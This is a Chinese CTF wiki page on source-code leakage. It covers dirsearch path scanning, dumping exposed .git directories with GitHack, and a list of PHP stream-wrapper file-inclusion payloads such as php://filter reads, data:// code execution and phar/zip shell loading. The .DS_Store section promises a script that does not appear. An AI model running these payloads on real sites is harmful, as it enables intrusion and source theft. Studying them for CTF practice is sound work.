# 源码泄露
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/).



很少很少会碰到flag放在泄露出来的源码里面


一般都是代码审计，所以会和其他很多东西交织在一起，属于一个比较中间的模块。

所以这里应该是不会有什么例子。

## dirsearch

其实就是一个软件的名称，用来扫后台路径的，讲不好可以扫出源码。


御剑我没用过hhh


（但是buu有访问限制会经常429.......所以记得加参数）


放上下载链接


[https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)


git clone下载就能用了记得chmod +x


然后用法一般是

./dirsearch -u URL -x 404,429,500...(看需求) -t 5(线程数) -d 0.1(访问延迟)

## .git源码泄露

开发人员会使用 git 进行版本控制，对站点自动部署。但如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞，我们可以利用这个漏洞直接获得网页源码。


通过网页访问 .git 目录，如果能访问就说明存在（权限不够也行）


要获取泄露的源码，可以使用 GitHack 工具


python（2） GitHack.py url


下载完之后的工作基本上是代码审计。


[https://github.com/BugScanTeam/GitHack](https://github.com/BugScanTeam/GitHack)


需要注意的，貌似我见过的都是py2写的，所以需要py2调用

## git文件修复

`git log --all`


一个是显示

`git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c`


一个是恢复

## ds_store

在Mac OS上会存在。


DS_Store 是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。删除以后的副作用就是这些信息的失去。（当然，这点副作用其实不是太大）


主要是如果拿到了这个文件由于各种编码的原因会很难受


于是给出一个解析读取这类文件的脚本：

## php伪协议

其实这个东西应该放在文件包含和文件上传里面的。纠结了一下，但还是，决定两个地方都放着(不过不会放很多，大头还是放在那边)：


include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file


这些都是常见的文件包含函数伪协议依托于这些函数来执行。。


以常见的include为例好了


最长使用的为php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）


会碰到include($_GET['NAME'])


然后你传个?NAME=php://filter/read=convert.base64-encode/resource=index.php


进去，然后就可以拿到index.php的base64编码的源码。


原理就是文件包含（之后介绍）


### php支持的伪协议有：


```plain
ftp://shell.php
file:///tmp/shell.php
http://xxxx/shell.php
\\smbserver\shell.php        //unc路径
phar://xxxx/x.zip/shell.php   //需将shell.php打包为x.zip上传
zip://xxxx/x.zip#shell.php    //需将shell.php打包为x.zip上传
php://filter/read=convert.base64-encode/resource=shell.php
compress.bzip2://shell.php
compress.zlib://shell.jpg
php://input    [POST DATA] <?php phpinfo()?>
data://text/plain,<?php phpinfo()?>                 //也可以data:text/plain,<?php phpinfo()?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
php://filter/read=convert.base64-encode/resource=phar://phar.phar
php://filter/convert.base64-decode|convert.base64-decode/resource=shell.php
php://filter/%72ead=convert.base64-encode/resource=shell.%70hp
Plain Text
```



读文件常用的也就php：（访问各个输入/输出流（I/O streams））


和file:（还有local_file,这个之后再说，好像是个cve）


所谓的伪协议，事实上是其支持的协议与封装协议

## google

有些代码（比如说直接的服务器端框架性的）试能够直接用github和google直接搜索到的


因此这也是一种形式上的源码泄露。








